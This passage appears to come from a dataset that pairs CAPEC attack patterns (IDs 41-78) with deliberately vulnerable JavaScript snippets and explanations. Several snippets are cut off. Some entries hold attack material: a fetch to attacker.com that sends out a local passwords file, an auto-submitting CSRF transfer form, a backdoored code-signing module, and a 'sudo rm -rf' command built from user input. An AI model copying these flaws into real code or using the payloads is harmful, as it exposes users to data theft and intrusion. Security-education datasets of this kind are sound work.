        "description": "This vulnerable code creates a network service that accepts arbitrary commands from connected clients and executes them directly on the system without any validation or sanitization. It allows remote command injection and exposes sensitive system information through unrestricted terminal access."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "function sendEmail(to, subject, body) {\n    let emailHeader = {\n        'To': to,\n        'Subject': subject,\n        'From': 'user@example.com',\n        'Content-Type': 'text/html'\n    };\n\n    // Vulnerable header processing - no sanitization\n    let customHeader = req.query.customHeader;\n    emailHeader['X-Custom'] = customHeader;\n\n    // Vulnerable content construction\n    let emailContent = `From: ${emailHeader['From']}\n`;\n    emailContent += `To: ${emailHeader['To']}\n`;\n    emailContent += `Subject: ${emailHeader['Subject']}\n`;\n    emailContent += `X-Custom: ${emailHeader['X-Custom']}\n\n`;\n    emailContent += body;\n\n    smtp.sendMail(emailContent);\n}",
        "description": "This code demonstrates vulnerable email header handling where meta-characters and special sequences in headers are not properly sanitized. It allows injection of malicious headers through the customHeader parameter and directly concatenates user input into email headers without proper encoding or validation, potentially allowing header injection attacks and malicious script execution through email clients."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(emailData) {\n    let buffer = new Buffer(1024); // Fixed size buffer\n    let mimeHeader = 'Content-Type: ' + emailData.contentType + '\\r\\n';\n    let base64Data = Buffer.from(emailData.content).toString('base64');\n    \n    // Vulnerable: No size checking before copy\n    buffer.write(mimeHeader);\n    buffer.write(base64Data, mimeHeader.length);\n    \n    // Vulnerable: No validation of content type\n    if(emailData.contentType.includes('multipart')) {\n        let boundary = emailData.boundary;\n        buffer.write('\\r\\n--' + boundary, buffer.length);\n    }\n    \n    return buffer;\n}",
        "description": "This code demonstrates a vulnerable MIME conversion routine that includes multiple security issues: a classic buffer overflow due to unchecked buffer copies, improper input validation of content type, and unsafe handling of MIME boundaries. The fixed-size buffer can be overflowed with large input data, and the content type is not properly validated before processing."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "`\nfunction processCommand(userInput) {\n    // First parser: removes double quotes\n    let parsed1 = userInput.replace(/\\\"/g, '');\n    \n    // Input validation: checks for dangerous commands\n    if (parsed1.includes('rm') || parsed1.includes('del')) {\n        return 'Invalid command detected';",
        "description": "\"This code is vulnerable to command injection through multiple parsing layers. The validation check occurs between two parsing operations, allowing an attacker to bypass the security check by encoding dangerous commands with special characters. The first parser removes quotes, then validation occurs, and finally escape characters are removed - potentially revealing a malicious command that was initially concealed. The attack succeeds because the validation happens before all parsing is complete.\""
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function processImageFile(imageData) {\n    const bufferSize = 1024;\n    let buffer = new Buffer(bufferSize);\n    \n    // Vulnerable: No size check before copy\n    for(let i = 0; i < imageData.length; i++) {\n        buffer[i] = imageData[i];\n    }\n    \n    // Vulnerable: Relies only on file extension\n    if(imageData.filename.toLowerCase().endsWith('.jpg')) {\n        // Process as JPEG\n        let imageHeader = buffer.slice(0, 10);\n        if(imageHeader.toString().includes('JFIF')) {\n            executeImageProcessor(buffer);\n        }\n    }\n}\n\nfunction executeImageProcessor(buffer) {\n    // Vulnerable: No bounds checking\n    let metadataLength = buffer[2] * 256 + buffer[3];\n    let metadata = buffer.slice(4, 4 + metadataLength);\n    \n    // Process metadata without validation\n    eval('processMetadata(\"' + metadata.toString() + '\")');\n}",
        "description": "This code demonstrates vulnerable handling of binary image data with multiple security issues: no input size validation before copying to a fixed buffer, unsafe reliance on file extension for type verification, and potential buffer overflow in metadata processing. The code also includes dangerous eval() execution of untrusted data from the binary file."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processSymlink(symlinkPath) {\n    let buffer = new Buffer(256);\n    let linkTarget = fs.readlinkSync(symlinkPath);\n    \n    // Vulnerable: no bounds checking on linkTarget length\n    for(let i = 0; i < linkTarget.length; i++) {\n        buffer[i] = linkTarget.charCodeAt(i);\n    }\n    \n    // Vulnerable: following symlink without validation\n    if(fs.existsSync(linkTarget)) {\n        let data = fs.readFileSync(linkTarget);\n        return data.toString();\n    }\n}\n\nfunction main() {\n    let userInput = process.argv[2];\n    let result = processSymlink(userInput);\n    console.log(result);\n}",
        "description": "This code demonstrates vulnerable handling of symbolic links, incorporating multiple vulnerabilities: buffer overflow through unchecked copying of symlink target path (CWE-120), improper input validation of symlink path (CWE-20), and potential symlink-based directory traversal. The code uses a fixed-size buffer but doesn't validate input length, allowing buffer overflow. It also follows symlinks without proper authorization checks (CWE-285) and doesn't validate the final target path."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "function processConfigData(configString) {\n    let buffer = new Array(50);\n    let configData = JSON.parse(configString);\n    \n    // Copy tag value to buffer without size check\n    if(configData.tag) {\n        for(let i = 0; i < configData.tag.length; i++) {\n            buffer[i] = configData.tag.charAt(i);\n        }\n    }\n    \n    // Process special formatting tags\n    for(let i = 0; i < buffer.length; i++) {\n        if(buffer[i] === '<') {\n            let tagContent = '';\n            while(buffer[i] !== '>' && i < buffer.length) {\n                tagContent += buffer[i];\n                i++;\n            }\n            // Process tag without validation\n            executeFormatting(tagContent);\n        }\n    }\n}",
        "description": "This code processes configuration data containing formatting tags without proper buffer size validation or input sanitization. It demonstrates multiple vulnerabilities including classic buffer overflow (CWE-120), improper bounds checking (CWE-119), and injection vulnerabilities (CWE-74) through unvalidated tag processing. The buffer has a fixed size but doesn't check input length, allowing overflow conditions when processing large tag values from the configuration data."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function processUserData(input) {\n    let buffer = new Array(100);\n    let expanded = '';\n    \n    // Expand input by repeating each character 10 times\n    for(let i = 0; i < input.length; i++) {\n        expanded += input[i].repeat(10);\n    }\n    \n    // Vulnerable copy without size check\n    for(let i = 0; i < expanded.length; i++) {\n        buffer[i] = expanded[i];\n    }\n    \n    return buffer.join('');\n}\n\n// Example usage that could trigger overflow\nlet userInput = 'A'.repeat(15);\nlet result = processUserData(userInput);",
        "description": "This code demonstrates a buffer overflow vulnerability by processing input data that expands during operation. It creates a fixed-size buffer but fails to verify if the expanded input will fit within the allocated space. Each input character is expanded 10 times, potentially exceeding the buffer's bounds. The code lacks proper input validation and size checks, making it vulnerable to buffer overflow attacks when the input length causes the expanded data to exceed the fixed buffer size of 100."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchUserData(filename) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', filename, true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4) {\n            var data = xhr.responseText;\n            // Send local file contents to attacker's server\n            fetch('https://attacker.com/collect?data=' + encodeURIComponent(data));\n        }\n    };\n    xhr.send();\n}\n\n// Vulnerable function called with local file path\nfetchUserData('file:///C:/Users/victim/passwords.txt');",
        "description": "This code demonstrates a vulnerable implementation that attempts to read local files through client-side JavaScript and exfiltrate the data to an attacker-controlled server. It fails to properly validate the input URL scheme, allowing access to the local filesystem through the 'file://' protocol. The code also exposes sensitive data through GET parameters and doesn't properly handle unexpected file types or references."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "`\n    const loginAttempt = (username, password) => {\n      const storedPassword = 'admin123';  // Password stored in plain text\n      const maxLoginAge = 365;  // Password expiration in days\n      let attempts = 0;\n    \n      function validateLogin(pwd) {\n        // No password complexity requirements\n        // No rate limiting on attempts\n        if(pwd === storedPassword) {\n          return { success: true, message: 'Login successful'",
        "description": "\"This code demonstrates multiple security vulnerabilities including weak password storage (plaintext), no password complexity requirements, excessive password age, single-factor authentication, and no protection against brute force attempts. The code includes a basic brute force implementation that can systematically try different password combinations without any rate limiting or lockout mechanism.\""
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "`\nfunction resetPassword(email) {\n  const user = findUserByEmail(email);\n  if (user) {\n    // Generate simple numeric token\n    const resetToken = Math.floor(Math.random() * 9999);\n    \n    // Store token in plaintext\n    user.resetToken = resetToken;\n    \n    // Send token via email\n    sendEmail(email, 'Password Reset', \n      'Your password reset token is: ' + resetToken);\n    \n    return true;",
        "description": "\"This code demonstrates multiple password recovery vulnerabilities: using a weak numeric token for password reset, storing the reset token in plaintext, transmitting the token insecurely via email, not implementing token expiration, and storing the new password in an easily recoverable format (base64). Additionally, there are no password strength requirements for the new password.\""
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "// Service Registry Implementation\nconst serviceRegistry = {\n    services: {},\n    \n    registerService: function(name, endpoint, metadata) {\n        // No authentication or validation\n        this.services[name] = {\n            endpoint: endpoint,\n            metadata: metadata,\n            wsdl: `http://${endpoint}/service?wsdl`\n        };\n    },\n\n    lookupService: function(name) {\n        // Direct registry lookup without verification\n        return this.services[name];\n    },\n\n    getServiceEndpoint: function(serviceName) {\n        const service = this.lookupService(serviceName);\n        // No validation of endpoint authenticity\n        return service ? service.endpoint : null;\n    },\n\n    executeServiceCall: function(serviceName, params) {\n        const endpoint = this.getServiceEndpoint(serviceName);\n        // Dangerous: Direct execution of service call with unvalidated input\n        return eval(`callService('${endpoint}', ${JSON.stringify(params)})`);\n    }\n};",
        "description": "This vulnerable service registry implementation demonstrates multiple security issues including lack of authorization checks, potential for registry poisoning, exposure of sensitive service information, and injection vulnerabilities through unvalidated inputs. The registry stores service information in cleartext and allows unrestricted registration and lookup of services without proper authentication or validation mechanisms."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "function processUserPath(userInput) {\n    // Attempt to create a file path based on user input\n    let filePath = '/home/user/' + userInput;\n    \n    // Vulnerable comparison that doesn't account for null bytes\n    if (filePath.indexOf('../') === -1) {\n        // Read file content - vulnerable to null byte injection\n        // e.g., 'legitimate.txt\\0../etc/passwd'\n        const fs = require('fs');\n        return fs.readFileSync(filePath);\n    }\n    return 'Invalid path';\n}",
        "description": "This code is vulnerable to null byte injection attacks as it does not properly sanitize user input containing null bytes (\\0). An attacker can bypass the directory traversal check by injecting a null byte, causing the string comparison to stop at the null byte while the file system operation processes the full string including path traversal sequences after the null byte."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function validateFilePath(userInput) {\n    // Basic validation checks for file path\n    if (!userInput.endsWith('/')) {\n        return false;\n    }\n    \n    // Vulnerable - doesn't properly handle null bytes\n    let path = userInput;\n    \n    // Attempt to read/write file\n    try {\n        // Attacker can input: 'malicious\\x00safe/'\n        // Null byte truncates at system level but passes validation\n        fs.writeFileSync(path, 'data');\n        return true;\n    } catch(e) {\n        return false;\n    }\n}",
        "description": "This code demonstrates vulnerability to null byte injection in file path validation. While it checks for a trailing slash, it fails to properly validate or sanitize null bytes in the input. An attacker can inject a null byte (\\x00) mid-string followed by valid characters to bypass the slash check while causing the system to truncate at the null byte during actual file operations."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "app.get('/user-lookup', (req, res) => {\n    const username = req.query.username;\n    const query = `SELECT * FROM users WHERE username = '${username}'`;\n    \n    db.query(query, (err, results) => {\n        if (err) {\n            res.status(500).send({\n                error: err.message,\n                query: query,\n                stack: err.stack\n            });\n            return;\n        }\n        \n        if (results.length === 0) {\n            res.status(404).send({\n                message: `User ${username} not found`,\n                debug: `Query executed: ${query}`,\n                dbInfo: process.env.DB_CONNECTION_STRING\n            });\n            return;\n        }\n        \n        res.json(results);\n    });\n});",
        "description": "This code demonstrates multiple vulnerabilities including SQL injection through unvalidated user input, exposure of sensitive information in error messages (database details and query structure), and use of GET method with sensitive query parameters. The error handling reveals internal system details and database connection information."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\nconst userAuth = {\n    savePassword: function(username, password) {\n        // Using simple MD5 hash - weak hashing algorithm\n        const hash = crypto.createHash('md5').update(password).digest('hex');\n        // Store in database\n        db.users.save({ username: username, password_hash: hash });\n    },\n    \n    validatePassword: function(username, password) {\n        const user = db.users.findOne({ username: username });\n        const inputHash = crypto.createHash('md5').update(password).digest('hex');\n        return user.password_hash === inputHash;\n    },\n\n    createUser: function(username, password) {\n        // No password complexity requirements\n        // No password expiration\n        if (password.length >= 1) {\n            this.savePassword(username, password);\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple password-related vulnerabilities: using MD5 (weak hashing algorithm susceptible to rainbow table attacks), no password complexity requirements, no password aging mechanism, and single-factor authentication. The hash can be easily looked up in pre-computed rainbow tables to recover the original password."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "// Client-side authentication check that can be bypassed\nclass ClientAuthenticator {\n  constructor() {\n    this.isAuthenticated = false;\n  }\n\n  checkAuth() {\n    // Critical security check that can be modified by client\n    if(localStorage.getItem('isAdmin') === 'true') {\n      this.isAuthenticated = true;\n      return true;\n    }\n    return false;\n  }\n\n  makeSecureRequest() {\n    if(this.checkAuth()) {\n      // Send request without server-side validation\n      fetch('/api/admin/sensitive-data', {\n        method: 'GET',\n        headers: {\n          'X-Is-Admin': localStorage.getItem('isAdmin')\n        }\n      });\n    }\n  }\n}",
        "description": "This vulnerable code demonstrates client-side authentication enforcement where critical security checks are performed in JavaScript that can be easily bypassed. The code relies on localStorage for authentication state which can be modified by users, and sends requests with client-controlled headers without proper server-side validation."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "// REST API endpoint handling sensitive data\napp.get('/api/user/details', function(req, res) {\n    const authToken = req.query.token;\n    const userId = req.query.userId;\n\n    // No proper SSL check\n    // No proper token validation\n    \n    const userData = {\n        ssn: '123-45-6789',\n        creditCard: '4111-1111-1111-1111',\n        password: 'hashedPassword'\n    };\n\n    // Store sensitive state in queryable location\n    globalThis.userSession = userData;\n\n    // Send sensitive data through potentially unsecured channel\n    res.status(200).json(userData);\n})",
        "description": "This code demonstrates multiple security vulnerabilities including: using GET method with sensitive query parameters, lack of proper SSL/TLS verification, insufficient authentication checks, exposing critical state data globally, and assuming channel security after SSL termination. The endpoint accepts sensitive requests via GET, stores critical data in globally accessible state, and transmits sensitive information without proper channel security verification."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\n// Insecure API endpoint for user management\napp.get('/api/deleteUser/:id', (req, res) => {\n  // No authentication check\n  // No role verification\n  deleteUser(req.params.id);\n  res.send('User deleted');",
        "description": "\"This code demonstrates multiple security vulnerabilities including improper authorization, unsafe HTTP GET methods for state-changing operations, and lack of privilege checks. The API endpoints allow unauthorized access to sensitive operations, use GET requests for data modification, and fail to verify user permissions before executing privileged functions.\""
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "// Session ID generation and management\nfunction generateSessionId() {\n    return 'session_' + Math.floor(Date.now() / 1000);\n}\n\nfunction createUserSession(username) {\n    let sessionId = generateSessionId();\n    sessions[sessionId] = {\n        username: username,\n        isAuthenticated: true,\n        createdAt: Date.now()\n    };\n    document.cookie = `sessionId=${sessionId}; path=/`;\n    return sessionId;\n}\n\nfunction validateSession(sessionId) {\n    if(sessions[sessionId]) {\n        return sessions[sessionId].isAuthenticated;\n    }\n    return false;\n}\n\nconst sessions = {};",
        "description": "The code demonstrates predictable session ID generation using a timestamp-based approach, lacking sufficient entropy and randomness. It creates session IDs that can be easily guessed by attackers due to their sequential and time-based nature. The session management also lacks proper validation and session fixation protection, storing sensitive information in a non-secure way and failing to implement proper session boundaries."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "`\n// Session handling middleware\nconst sessionMiddleware = (req, res, next) => {\n  // Get session ID from cookie without validation\n  const sessionId = req.cookies.sessionId;\n  \n  // Blindly trust and reuse the session ID without verification\n  if (sessionId) {\n    req.session = sessions[sessionId];\n    // No session expiration check\n    // No origin validation\n    // No session regeneration\n    return next();",
        "description": "\"This code demonstrates vulnerable session management that's susceptible to session replay attacks. It lacks proper session validation, doesn't verify session origin, uses persistent cookies, doesn't implement session expiration, and fails to regenerate session IDs upon authentication. The code also stores sensitive information in cookies without proper security controls and doesn't properly invalidate existing sessions.\""
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "`\nconst sessions = new Map();\n\nfunction login(username, password, sessionId) {\n  // Allow client-provided session ID without validation\n  if (!sessionId) {\n    sessionId = Math.random().toString(36);",
        "description": "\"The code demonstrates session fixation vulnerability by allowing client-provided session IDs without validation or regeneration upon authentication. It fails to invalidate existing sessions during login and relies on client-side session management, enabling attackers to predict or force known session identifiers before user authentication.\""
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "// Server-side code\napp.post('/transfer-money', function(req, res) {\n    // No CSRF token validation\n    // Only relies on session cookie for authentication\n    const amount = req.body.amount;\n    const toAccount = req.body.toAccount;\n    \n    // Missing proper authentication check\n    if(req.cookies.sessionId) {\n        // Vulnerable transfer function\n        transferMoney(req.cookies.sessionId, amount, toAccount);\n        res.json({success: true});\n    }\n});\n\n// Malicious client-side code\n<form style='display:none' action='http://bank.com/transfer-money' method='POST'>\n    <input type='hidden' name='amount' value='1000'>\n    <input type='hidden' name='toAccount' value='attacker-account'>\n</form>\n<script>\n    document.forms[0].submit(); // Auto-submits when victim visits page\n</script>",
        "description": "This code demonstrates a CSRF vulnerability where a banking application fails to implement proper request verification and relies solely on session cookies. The server endpoint lacks CSRF token validation and proper authentication checks. The attack payload contains a hidden form that automatically submits a money transfer request to the vulnerable endpoint, utilizing the victim's active session cookie."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "function displayUserComment(comment) {\n    let commentSection = document.getElementById('comments');\n    commentSection.innerHTML = comment; // Vulnerable: directly inserting user input into DOM\n}\n\nfunction submitComment() {\n    let userInput = document.getElementById('userInput').value;\n    displayUserComment(userInput);\n}\n\nfunction showErrorMessage(error) {\n    let errorDiv = document.getElementById('errorMessages');\n    errorDiv.innerHTML = 'Error: ' + error; // Vulnerable: unsanitized error display\n}\n\nfunction displayUserProfile(profileData) {\n    let profile = document.getElementById('profile');\n    let img = '<img src=\"' + profileData.avatar + '\" onerror=\"alert(1)\">';  // Vulnerable: unsanitized img attributes\n    profile.innerHTML = img;\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through direct DOM manipulation without input sanitization, including unsafe innerHTML usage with user input, unsanitized error message display, and unsafe handling of image attributes that could contain malicious scripts."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "function serveFile(req, res) {\n  let requestedPath = req.query.path;\n  // Attempt basic URL decode only, missing other encodings\n  requestedPath = decodeURIComponent(requestedPath);\n  \n  // Vulnerable validation - doesn't account for all encoding variations\n  if(!requestedPath.includes('../')) {\n    const filePath = '/var/www/files/' + requestedPath;\n    const fileContent = fs.readFileSync(filePath);\n    res.send(fileContent);\n  } else {\n    res.status(403).send('Invalid path');\n  }\n}",
        "description": "This code is vulnerable to URL encoding attacks because it only performs basic URL decoding and has insufficient path validation. An attacker could use various encoding schemes (UTF-8, Unicode, double encoding) to bypass the '../' check and achieve path traversal. For example, '%2e%2e%2f' or '%252e%252e%252f' could be used to encode '../' in different ways that might bypass the check but still resolve to directory traversal sequences."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "// Client-side code for software update\nfunction downloadAndApplyUpdate() {\n    const updateUrl = 'http://example.com/updates/latest.js';\n    fetch(updateUrl)\n        .then(response => response.text())\n        .then(code => {\n            // Store sensitive configuration in cleartext\n            const config = {\n                apiKey: '1234567890abcdef',\n                serverEndpoint: 'http://api.example.com',\n                userCredentials: {\n                    username: 'admin',\n                    password: 'secretpass123'\n                }\n            };\n            \n            // Execute downloaded code without verification\n            eval(code);\n            \n            // Send sensitive data without encryption\n            fetch('http://api.example.com/sync', {\n                method: 'POST',\n                body: JSON.stringify(config)\n            });\n        });\n}",
        "description": "This code demonstrates multiple security vulnerabilities including transmission of sensitive data over HTTP, storing credentials in cleartext, downloading and executing code without integrity verification, and sending unencrypted sensitive information over the network."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst connection = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'users'\n});\n\napp.get('/user', (req, res) => {\n    const username = req.query.username;\n    const query = `SELECT * FROM users WHERE username = '${username}'`;\n    \n    connection.query(query, (error, results) => {\n        if (error) {\n            res.status(500).send('Database error: ' + error.message);\n            return;\n        }\n        res.json(results);\n    });\n});",
        "description": "This code demonstrates a classic SQL injection vulnerability where user input (username) is directly concatenated into an SQL query without proper sanitization. The code also reveals sensitive error messages and leaves database connections open. An attacker can inject malicious SQL through the username parameter to manipulate the query's logic or execute arbitrary SQL commands."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "`\nfunction logUserActivity(username, action) {\n    let logMessage = username + ' performed action: ' + action;\n    syslog(logMessage);  // Vulnerable: No format string specified\n    \n    function syslog(message) {\n        let buffer = new Buffer(50);  // Fixed buffer size\n        let logFormat = message;  // Format string controlled by user input\n        \n        // Vulnerable: No size checking before copy\n        buffer.write(logFormat);\n        \n        // Process format string directly without sanitization\n        let formattedLog = logFormat.replace(/%s|%d|%x/g, function(match) {\n            return getNextArgument();  // Potentially dangerous format string processing",
        "description": "\"This code demonstrates vulnerable syslog usage by not specifying a format string parameter and accepting unsanitized user input. It includes a buffer overflow vulnerability due to fixed buffer size, format string injection through user-controlled input, and improper input validation. The syslog implementation processes format specifiers without proper checks, allowing for potential memory corruption.\""
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "// Malicious code masquerading as a legitimate signed module\nconst crypto = require('crypto');\n\nclass SecurityModule {\n  constructor() {\n    this.weakHash = 'md5'; // Intentionally weak hash algorithm\n    this.fakeSignature = '1234567890';\n  }\n\n  verifyCodeSignature(code, signature) {\n    // Deliberately broken signature verification\n    const hash = crypto.createHash(this.weakHash)\n      .update(code)\n      .digest('hex');\n    \n    // Always returns true, bypassing actual verification\n    return true;\n  }\n\n  executePrivilegedCode(code) {\n    if(this.verifyCodeSignature(code, this.fakeSignature)) {\n      // Malicious code execution with elevated privileges\n      eval(code);\n    }\n  }\n\n  // Backdoor that appears to be optimization code\n  optimizeExecution(code) {\n    const backdoorCode = code + ';' + 'process.env.BACKDOOR=true';\n    this.executePrivilegedCode(backdoorCode);\n  }\n}",
        "description": "A malicious security module that deliberately undermines code signing verification by using weak cryptographic algorithms and containing a hidden backdoor. It bypasses signature checks and allows unauthorized code execution with elevated privileges, while appearing to be a legitimate optimization component."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction systemCleanup(userInput) {\n  // Runs cleanup with root privileges\n  const sudo = 'sudo';\n  exec(`${sudo} rm -rf ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error}`);\n      return;\n    }\n    console.log(`Cleanup completed: ${stdout}`);\n  });\n}\n\n// Accept input from external source\nconst userPath = process.argv[2];\nsystemCleanup(userPath);",
        "description": "This code demonstrates a vulnerable system cleanup function that executes with unnecessary elevated privileges (sudo) and directly incorporates user input into system commands without proper validation or sanitization. It accepts command-line arguments that could be manipulated to inject malicious OS commands, potentially leading to arbitrary code execution with root privileges."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const users = {\n  admin: 'admin',\n  root: 'root',\n  guest: '',\n  system: 'password123'\n};\n\nfunction login(username, password) {\n  if (users[username] === password) {\n    grantAccess(username);\n    return true;\n  }\n  return false;\n}\n\nfunction grantAccess(username) {\n  // Grant full system access based on single-factor auth\n  const token = 'static_secret_token';\n  return {\n    user: username,\n    token: token,\n    isAuthenticated: true\n  };\n}",
        "description": "Vulnerable authentication system using hard-coded credentials, weak passwords, single-factor authentication, and no password aging mechanism. Contains default vendor credentials and common weak passwords stored in plaintext."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "`function validateAndProcessInput(userInput) {\n        // Basic validation before normalization\n        if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n            return false;",
        "description": "\"This code demonstrates vulnerable input validation that fails to properly handle Unicode and alternate encodings. It performs validation before normalization, allowing attackers to bypass security checks using Unicode characters or alternate encodings. The code also uses eval() with insufficiently sanitized input, making it susceptible to injection attacks.\""
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst server = http.createServer((req, res) => {\n  // Get filename from URL parameter without proper decoding/validation\n  const fileName = req.url.split('?file=')[1];\n\n  // Vulnerable: directly using user input for file operations\n  fs.readFile('/var/www/files/' + fileName, (err, data) => {\n    if (err) {\n      res.writeHead(404);\n      return res.end('File not found');\n    }\n    res.writeHead(200);\n    res.end(data);\n  });\n});\n\nserver.listen(3000);",
        "description": "This vulnerable code accepts a file name via URL parameter without proper URL decoding or input validation. It allows path traversal through URL encoding manipulation (e.g., %2e%2e%2f for '../') and directly uses user input in file operations. An attacker could access files outside the intended directory using encoded path traversal sequences."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "function displayUserFile(filename) {\n  // Construct HTML element for displaying filename\n  let fileDisplay = document.createElement('div');\n  fileDisplay.innerHTML = 'Uploaded file: ' + filename;\n  \n  // Create download link\n  let downloadLink = document.createElement('a');\n  downloadLink.href = '/downloads/' + filename;\n  downloadLink.innerHTML = '<img src=\"/icons/download.png\" alt=\"' + filename + '\">Download';\n  \n  // Add elements to page\n  document.getElementById('fileList').appendChild(fileDisplay);\n  document.getElementById('fileList').appendChild(downloadLink);\n}",
        "description": "This vulnerable code directly inserts user-provided filenames into HTML content without proper validation or sanitization. An attacker could upload a file with a name containing malicious JavaScript or HTML, such as '><script>alert(1)</script>.txt', which would then be executed when rendered in the browser. The code fails to escape special characters and doesn't validate the filename against a whitelist of allowed characters, enabling XSS attacks through filename manipulation."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "`\n    class UserSession {\n      constructor() {\n        this.isAdmin = false;\n        this.userState = {",
        "description": "\"Vulnerable code demonstrating improper state management, where user session state can be manipulated through unprotected state transitions, cleartext cookie storage, and incomplete state validation. The code lacks integrity checks and proper protection mechanisms for state changes, allowing potential privilege escalation through state manipulation.\""
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\nfunction updateConfigFile(configPath, newData) {\n  // Accept data from external source without validation\n  let configContent = fs.readFileSync(configPath, 'utf8');\n  \n  // Merge trusted config with untrusted data without validation\n  let updatedConfig = Object.assign({}, JSON.parse(configContent), newData);\n  \n  // Execute system commands using unvalidated input\n  exec(`echo '${JSON.stringify(updatedConfig)}' > ${configPath}`, (error, stdout, stderr) => {\n    if (error) console.error(`Error: ${error}`);\n  });\n\n  // No integrity checking of the modified file\n  return true;\n}",
        "description": "This vulnerable code demonstrates manipulation of configuration files without proper validation or integrity checks. It accepts untrusted data and merges it with trusted config files, executes system commands with unvalidated input, and lacks origin validation and integrity verification. The code allows for potential command injection and unauthorized modification of sensitive configuration files."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', (req, res) => {\n  const userFile = req.query.file;\n  const filePath = './documents/' + userFile;\n\n  try {\n    const data = fs.readFileSync(filePath);\n    res.send(data);\n  } catch(err) {\n    res.status(404).send('File not found');\n  }\n});",
        "description": "This code contains a path traversal vulnerability by directly concatenating user input to form a file path without proper validation or sanitization. An attacker can use '../' sequences to access files outside the intended directory. The code also lacks proper authorization checks and doesn't validate the origin of the request, allowing unauthorized access to sensitive files."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "// User configuration object\nlet config = {\n  isAdmin: false,\n  debugMode: false\n};\n\n// Vulnerable function that merges user input with config\nfunction updateConfig(userInput) {\n  for (let key in userInput) {\n    if (userInput.hasOwnProperty(key)) {\n      config[key] = userInput[key];\n    }\n  }\n}\n\n// Vulnerable endpoint handling user input\nfunction handleRequest(params) {\n  updateConfig(JSON.parse(params));\n  if (config.debugMode) {\n    eval(config.debugCommand);\n  }\n  return config.isAdmin;\n}",
        "description": "This code demonstrates multiple vulnerabilities including external control of system settings (CWE-15), prototype pollution (CWE-1321), and code injection (CWE-94). The updateConfig function blindly accepts user input to modify system configuration, while the eval() usage allows for code injection. An attacker can manipulate the config object to gain admin access or execute arbitrary code through the debugCommand parameter."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
